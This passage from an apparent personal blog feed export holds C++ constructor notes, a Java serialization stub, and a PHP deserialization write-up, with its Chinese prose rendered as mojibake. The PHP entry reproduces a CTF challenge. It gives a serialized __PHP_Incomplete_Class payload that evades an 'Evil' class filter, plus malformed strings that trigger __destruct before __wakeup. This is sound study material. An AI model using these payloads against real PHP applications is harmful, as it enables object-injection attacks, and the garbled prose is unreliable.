class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;destruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æœ‰å‚æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the contrust funtion include args&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‹·è´æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">const</span> Person &amp;p)&#123;</span><br><span class="line">        <span class="comment">//å°†ä¼ å…¥çš„ç±»çš„æ‰€æœ‰å±æ€§æ‹·è´åˆ°æœ¬ç±»èº«ä¸Š</span></span><br><span class="line">        age = p.age;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;copy contruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ‹¬å·æ³•</span></span><br><span class="line">    <span class="comment">// Person p1; </span></span><br><span class="line">    <span class="comment">// Person p2(10);</span></span><br><span class="line">    <span class="comment">// Person p3(p2);</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;*****************************&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ˜¾ç¤º</span></span><br><span class="line">    <span class="comment">// Person p1;</span></span><br><span class="line">    <span class="comment">// Person p2 = Person(10);</span></span><br><span class="line">    <span class="comment">// Person p3 = Person(p2);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Person(10); // åŒ¿åå¯¹è±¡ å½“å‰è¡Œæ‰§è¡Œç»“æŸä¹‹åï¼Œç³»ç»Ÿç«‹å³å›æ”¶</span></span><br><span class="line">    <span class="comment">// // æ³¨æ„ï¼šä¸èƒ½åˆ©ç”¨æ‹·è´æ„é€ å‡½æ•°åˆå§‹åŒ–åŒ¿åå¯¹è±¡</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;*****************************&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// éšå¼è½¬æ¢</span></span><br><span class="line">    Person p1 = <span class="number">10</span>;</span><br><span class="line">    Person p2 = p1;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ‹·è´æ„é€ å‡½æ•°çš„è°ƒç”¨</strong></p>
<p>â€‹    1.ä½¿ç”¨ä¸€ä¸ªåˆ›å»ºå®Œæ¯•çš„å¯¹è±¡æ¥åˆå§‹åŒ–ä¸€ä¸ªæ–°å¯¹è±¡</p>
<p>â€‹    2.å€¼ä¼ é€’çš„æ–¹å¼ç»™å‡½æ•°å‚æ•°ä¼ å€¼</p>
<p>â€‹    3.å€¼æ–¹å¼è¿”å›å±€éƒ¨å¯¹è±¡</p>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;destruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">const</span> Person &amp;p)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;copy contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(Person p)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Person <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p = <span class="built_in">test1</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//    1.ä½¿ç”¨ä¸€ä¸ªåˆ›å»ºå®Œæ¯•çš„å¯¹è±¡æ¥åˆå§‹åŒ–ä¸€ä¸ªæ–°å¯¹è±¡</span></span><br><span class="line">    Person p1;</span><br><span class="line">    Person p2 = <span class="built_in">test1</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//    2.å€¼ä¼ é€’çš„æ–¹å¼ç»™å‡½æ•°å‚æ•°ä¼ å€¼</span></span><br><span class="line">    <span class="comment">// test(p1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    3.å€¼æ–¹å¼è¿”å›å±€éƒ¨å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// Person p3 = test1();</span></span><br><span class="line">    <span class="comment">// test2();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>è¯­è¨€å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>javaåºåˆ—åŒ–å­¦ä¹ </title>
    <url>/2022/01/17/java%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p> å› ä¸ºä¸Šå­¦æœŸå­¦äº†javaè¯¾ï¼Œä½†æ˜¯å‘ç°åˆ«çš„ç­è®²äº†åºåˆ—åŒ–å’Œæ­£åˆ™ä¹‹ç±»çš„ï¼Œæ‰€ä»¥æ‰“ç®—å­¦ä¸€ä¸‹</p>
</blockquote>
<h4 id="ä¸€ã€åºåˆ—åŒ–æ¦‚è¿°"><a href="#ä¸€ã€åºåˆ—åŒ–æ¦‚è¿°" class="headerlink" title="ä¸€ã€åºåˆ—åŒ–æ¦‚è¿°"></a>ä¸€ã€åºåˆ—åŒ–æ¦‚è¿°</h4><p>åºåˆ—åŒ–æ˜¯æŒ‡æŠŠä¸€ä¸ªJavaå¯¹è±¡å˜æˆäºŒè¿›åˆ¶å†…å®¹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªbyte[]æ•°ç»„ã€‚ åºåˆ—åŒ–åå¯ä»¥æŠŠbyte[]ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œæˆ–è€…æŠŠbyte[]é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°è¿œç¨‹ï¼Œè¿™æ ·ï¼Œå°±ç›¸å½“äºæŠŠJavaå¯¹è±¡å­˜å‚¨åˆ°æ–‡ä»¶æˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“å‡ºå»äº†ã€‚ æœ‰åºåˆ—åŒ–ï¼Œå°±æœ‰ååºåˆ—åŒ–ï¼Œå³æŠŠä¸€ä¸ªäºŒè¿›åˆ¶å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯byte[]æ•°ç»„ï¼‰å˜å›Javaå¯¹è±¡ã€‚æœ‰äº†ååºåˆ—åŒ–ï¼Œä¿å­˜åˆ°æ–‡ä»¶ä¸­çš„byte[]æ•°ç»„åˆå¯ä»¥â€œå˜å›â€Javaå¯¹è±¡ï¼Œæˆ–è€…ä»ç½‘ç»œä¸Šè¯»å–byte[]å¹¶æŠŠå®ƒâ€œå˜å›â€Javaå¯¹è±¡ã€‚<u>ï¼ˆæ¥æºç½‘ç»œï¼‰</u></p>
<p>åºåˆ—åŒ–æœ€é‡è¦çš„ä½œç”¨ï¼šåœ¨ä¼ é€’å’Œä¿å­˜å¯¹è±¡æ—¶.ä¿è¯å¯¹è±¡çš„å®Œæ•´æ€§å’Œå¯ä¼ é€’æ€§ã€‚å¯¹è±¡è½¬æ¢ä¸ºæœ‰åºå­—èŠ‚æµ,ä»¥ä¾¿åœ¨ç½‘ç»œä¸Šä¼ è¾“æˆ–è€…ä¿å­˜åœ¨æœ¬åœ°æ–‡ä»¶ä¸­ã€‚</p>
<p>ååºåˆ—åŒ–çš„æœ€é‡è¦çš„ä½œç”¨ï¼šæ ¹æ®å­—èŠ‚æµä¸­ä¿å­˜çš„å¯¹è±¡çŠ¶æ€åŠæè¿°ä¿¡æ¯ï¼Œé€šè¿‡ååºåˆ—åŒ–é‡å»ºå¯¹è±¡ã€‚</p>
<p>æ€»ç»“ï¼šæ ¸å¿ƒä½œç”¨å°±æ˜¯å¯¹è±¡çŠ¶æ€çš„ä¿å­˜å’Œé‡å»ºã€‚ï¼ˆæ•´ä¸ªè¿‡ç¨‹æ ¸å¿ƒç‚¹å°±æ˜¯å­—èŠ‚æµä¸­æ‰€ä¿å­˜çš„å¯¹è±¡çŠ¶æ€åŠæè¿°ä¿¡æ¯ï¼‰</p>
<p>ä¾‹å¦‚åœ¨phpä¸­å¦‚æœè¦ä¿å­˜ä¸€ä¸ªç±»ï¼Œå¯ä»¥åˆ©ç”¨åºåˆ—åŒ–å°†ç±»ä¿å­˜æˆäºŒè¿›åˆ¶å†…å®¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">var_dump(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"></span><br><span class="line"><span class="comment">//string(12) &quot;O:1:&quot;A&quot;:0:&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="äºŒã€javaåºåˆ—åŒ–"><a href="#äºŒã€javaåºåˆ—åŒ–" class="headerlink" title="äºŒã€javaåºåˆ—åŒ–"></a>äºŒã€javaåºåˆ—åŒ–</h4><h4 id="ä¸‰ã€javaæ­£åˆ™åŒ¹é…"><a href="#ä¸‰ã€javaæ­£åˆ™åŒ¹é…" class="headerlink" title="ä¸‰ã€javaæ­£åˆ™åŒ¹é…"></a>ä¸‰ã€javaæ­£åˆ™åŒ¹é…</h4>]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>åºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>phpååºåˆ—åŒ–å†·çŸ¥è¯†å¤ç°</title>
    <url>/2022/01/23/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="å‰ææ¦‚è¦"><a href="#å‰ææ¦‚è¦" class="headerlink" title="å‰ææ¦‚è¦"></a>å‰ææ¦‚è¦</h2><p><a href="https://zhuanlan.zhihu.com/p/405838002">https://zhuanlan.zhihu.com/p/405838002</a></p>
<p>ä¹‹å‰æ¯”èµ›é‡åˆ°çš„é¢˜ç›®ï¼Œæ ¹æ®å¸ˆå‚…çš„å›ç­”å¤ç°ä¸€ä¸‹</p>
<h2 id="PHP-Incomplete-Class"><a href="#PHP-Incomplete-Class" class="headerlink" title="__PHP_Incomplete_Class"></a>__PHP_Incomplete_Class</h2><p>å½“ååºåˆ—åŒ– <code>__PHP_Incomplete_Class</code>  è¿™ä¸ªç±»åï¼Œå†å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–æ—¶ï¼Œå…¶å±æ€§ä¼šæ¶ˆå¤±ã€‚</p>
<p><strong>0x01:</strong></p>
<p>é¦–å…ˆ<code>__PHP_Incomplete_Class</code>æ˜¯å½“ååºåˆ—åŒ–ä¸€ä¸ªä¸å­˜åœ¨çš„ç±»æ—¶å‡ºç°çš„ç±»ï¼Œè€Œ<code>__PHP_Incomplete_Class_Name</code>å±æ€§å°±æ˜¯ååºåˆ—åŒ–æ—¶ä¸å­˜åœ¨çš„ç±»çš„ç±»åï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class A&#123;</span></span><br><span class="line"><span class="comment">//     public $test = &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(serialize(unserialize(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//object(__PHP_Incomplete_Class)#1 (2) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;   </span></span><br><span class="line"><span class="comment">//  string(1) &quot;A&quot;</span></span><br><span class="line"><span class="comment">//  [&quot;test&quot;]=&gt;</span></span><br><span class="line"><span class="comment">//  string(1) &quot;a&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//string(31) &quot;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>è€Œå½“å†æ¬¡ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå†…å®¹å¹¶æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œè¿™å°±è¯´æ˜äº†å½“åºåˆ—åŒ–<code>__PHP_Incomplete_Class</code>æ—¶ä¼šå…ˆå»æŸ¥æ‰¾å±æ€§<code>__PHP_Incomplete_Class_Name</code>çš„å€¼ï¼Œç„¶åè¿›è¡Œåºåˆ—åŒ–ä¸ºç›¸å¯¹åº”çš„ç±»</p>
<p>è€Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¯¥ç‰¹ç‚¹æ„é€ ç›¸å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œå³æ„é€ å­˜åœ¨<code>__PHP_Incomplete_Class</code>ç±»ä½†ç±»ä¸­å´ä¸å­˜åœ¨<code>__PHP_Incomplete_Class_Name</code>å±æ€§ï¼Œå½“è¯¥å­—ç¬¦ä¸²ç»è¿‡ååºåˆ—åŒ–å’Œåºåˆ—åŒ–ä¹‹åå°±ä¼šä¸¢å¼ƒç±»é‡Œé¢çš„å…¶ä»–å±æ€§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class A&#123;</span></span><br><span class="line"><span class="comment">//     public $test = &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(serialize(unserialize(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//object(__PHP_Incomplete_Class)#1 (1) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;test&quot;]=&gt;</span></span><br><span class="line"><span class="comment">//  string(1) &quot;a&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//string(34) &quot;O:22:&quot;__PHP_Incomplete_Class&quot;:0:&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="n-3ctf-Ezunser"><a href="#n-3ctf-Ezunser" class="headerlink" title="n^3ctf_Ezunser"></a>n^3ctf_Ezunser</h3><p><a href="https://buuoj.cn/match/matches/68/challenges">é¢˜ç›®</a></p>
<p>ååºåˆ—åŒ–æœªå®šä¹‰çš„ç±»</p>
<p>ç›´æ¥ç»™äº†æºç ï¼š</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myAutoloader</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$classname</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    spl_autoload_register(<span class="string">&#x27;myAutoloader&#x27;</span>);</span><br><span class="line">    <span class="variable">$raw</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Evil/&quot;</span>,<span class="variable">$raw</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Evil Classes!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    var_dump(<span class="variable">$o</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;EvillClass.php&quot;</span>;</span><br><span class="line">    highlight_file(<span class="string">&quot;EvilClass.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x01:</strong></p>
<p>å…ˆå®¡è®¡<code>index.php</code></p>
<p>ç¬¬ä¸€ä¸ªç‚¹åœ¨äº<code>spl_autoload_register</code>ï¼Œå½“è°ƒç”¨<code>index.php</code>ä¸­æ²¡æœ‰å®šä¹‰çš„ç±»çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>myAutoloader($classname)</code>ï¼Œå…¶ä¸­<code>$classname</code>å°±æ˜¯æˆ‘ä»¬æƒ³å®ä¾‹åŒ–çš„ç±»</p>
<p>æƒ³å½“ç„¶åœ°æˆ‘ä»¬æƒ³è°ƒç”¨<code>EvilClass.php</code>é‡Œé¢çš„ç±»ï¼Œæ‰€ä»¥è¦<code>include EvilClass.php</code>ï¼Œä½†æ˜¯æ–‡ä»¶é‡Œè¿˜æ˜¯æ²¡æœ‰å®šä¹‰<code>EvilClass</code>ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€ä¸ª[phpååºåˆ—çš„å†·çŸ¥è¯†](<a href="https://zhuanlan.zhihu.com/p/405838002">PHPåºåˆ—åŒ–å†·çŸ¥è¯† - çŸ¥ä¹ (zhihu.com)</a>)</p>
<p>æˆ‘ä»¬è¿˜å‘ç°ä¹‹åçš„ifåˆ¤æ–­è¯­å¥ä¸­banæ‰äº†<code>Evil</code>ï¼Œè¿™å°±è¯´æ˜åœ¨åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ä¸­ä¸èƒ½å†å‡ºç°<code>EvilClass</code>ï¼Œä¸è¿‡å¯ä»¥ç›´æ¥æ‹¿é‡Œé¢çš„payload</p>
<p>æ‰€ä»¥payload1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>â€¦â€¦</p>
<h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast __destruct"></a>fast __destruct</h2><p>åœ¨__wakeupå‰è§¦å‘ __destruct</p>
<blockquote>
<p>1ã€å¦‚æœå•ç‹¬æ‰§è¡Œ<code>unserialize</code>å‡½æ•°è¿›è¡Œå¸¸è§„çš„ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–åçš„æ•´ä¸ªå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå°±ä»…é™äºè¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„ç”Ÿå‘½å‘¨æœŸï¼Œå½“è¿™ä¸ªå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¿™ä¸ªç±»å°±æ²¡äº†ï¼Œåœ¨æœ‰ææ„å‡½æ•°çš„æƒ…å†µä¸‹å°±ä¼šæ‰§è¡Œå®ƒã€‚<br>2ã€å¦‚æœååºåˆ—åŒ–å‡½æ•°åºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡è¢«èµ‹ç»™äº†ç¨‹åºä¸­çš„å˜é‡ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–çš„å¯¹è±¡å…¶ç”Ÿå‘½å‘¨æœŸå°±ä¼šå˜é•¿ï¼Œç”±äºå®ƒä¸€ç›´éƒ½å­˜åœ¨äºè¿™ä¸ªå˜é‡å½“ä¸­ï¼Œå½“è¿™ä¸ªå¯¹è±¡è¢«é”€æ¯ï¼Œæ‰ä¼šæ‰§è¡Œå…¶ææ„å‡½æ•°ã€‚</p>
</blockquote>
<p>è€Œæœ‰æ—¶å€™æˆ‘ä»¬å¦‚æœæå‰æ‰§è¡Œ<code>__destruct</code>(ææ„å‡½æ•°)å°±ä¼šç»•è¿‡é¢˜ç›®ä¸­æŸäº›é™åˆ¶,ä»è€Œäº§ç”Ÿåˆ©ç”¨ç‚¹,æ¯”å¦‚å°±å¯ä»¥bypass __wakeup(ä¸è¿‡ä¸phpç‰ˆæœ¬æœ‰å…³)</p>
<p>æå‰è§¦å‘çš„æ–¹æ³•:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å±æ€§ä¸ªæ•°å€¼:</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ls&quot;;&#125;</span><br><span class="line">å»æ‰åºåˆ—åŒ–å°¾éƒ¨:</span><br><span class="line">O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:2:&quot;ls&quot;;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å­:å¯ä»¥æ˜æ˜¾çœ‹åˆ°var_dumpæ‰§è¡Œçš„é¡ºåºæ˜¯ä¸ä¸€æ ·çš„</p>
<p><img src="https://img-blog.csdnimg.cn/42e9ecc30f99495a84db2910200a26cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/0cf72b36e6914f3fb8b0aeaab0227223.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h2 id="ååºåˆ—åŒ–å‡½æ•°é—­åŒ…"><a href="#ååºåˆ—åŒ–å‡½æ•°é—­åŒ…" class="headerlink" title="ååºåˆ—åŒ–å‡½æ•°é—­åŒ…"></a>ååºåˆ—åŒ–å‡½æ•°é—­åŒ…</h2><p>é—­åŒ…å‡½æ•°ä¹Ÿå°±æ˜¯åŒ¿åå‡½æ•°,è€Œåœ¨å®šä¹‰é—­åŒ…å‡½æ•°çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨å®ä¾‹åŒ–<code>Closure</code>ç±»</p>
<p><img src="https://img-blog.csdnimg.cn/ce5c520a5605423e85df8d87c7e6ba64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ä½†æ˜¯ç›´æ¥ç”¨phpè‡ªå¸¦çš„<code>serialize</code>å‡½æ•°å¯¹è¿™ä¸ªç±»è¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™ä¼šæŠ¥é”™,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å·¥å…·å»å®ç°é—­åŒ…å‡½æ•°çš„åºåˆ—åŒ–</p>
<p><strong>0x01:å®‰è£…</strong></p>
<p><a href="https://github.com/opis/closure">closure</a></p>
<p><img src="https://img-blog.csdnimg.cn/d503d9e6d45e4162a781cab5c86a794f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>0x02:ä½¿ç”¨</strong></p>
<p>ä¹‹åç›´æ¥æµ‹è¯•å§ï¼Œå¯ä»¥å‘ç°é—­åŒ…å‡½æ•°ç›´æ¥ç”¨<code>unserialize</code>ååºåˆ—åŒ–ä¹‹åå’Œ<code>opis\closure\unserialize</code>ååºåˆ—åŒ–çš„æ—¶å€™çš„è¿”å›å€¼æ˜¯ä¸ä¸€æ ·çš„ä½†æ˜¯éƒ½å¯ä»¥ç›´æ¥å½“ä½œå‡½æ•°ä½¿ç”¨ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;vendor/autoload.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$b</span> = opis\<span class="built_in">closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">var_dump(opis\<span class="built_in">closure</span>\serialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(unserialize(<span class="variable">$b</span>));</span><br><span class="line">unserialize(<span class="variable">$b</span>)();</span><br><span class="line">var_dump(opis\<span class="built_in">closure</span>\unserialize(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//string(198) &quot;C:32:&quot;Opis\Closure\SerializableClosure&quot;:152:&#123;a:5:&#123;s:3:&quot;use&quot;;a:0:&#123;&#125;s:8:&quot;function&quot;;s:29:&quot;function()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;a&quot;;</span></span><br><span class="line"><span class="comment">//&#125;&quot;;s:5:&quot;scope&quot;;N;s:4:&quot;this&quot;;N;s:4:&quot;self&quot;;s:32:&quot;000000000bc714b9000000004a5c0eab&quot;;&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(Opis\Closure\SerializableClosure)#2 (5) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;closure&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  object(Closure)#5 (0) &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  [&quot;reflector&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//  [&quot;code&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  string(29) &quot;function()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;a&quot;;</span></span><br><span class="line"><span class="comment">//&#125;&quot;</span></span><br><span class="line"><span class="comment">//  [&quot;reference&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//  [&quot;scope&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(Closure)#7 (0) &#123;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<p>â€“tbc</p>
]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>é›†è®­ç¬¬äºŒå‘¨å­¦ä¹ </title>
    <url>/2022/01/22/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
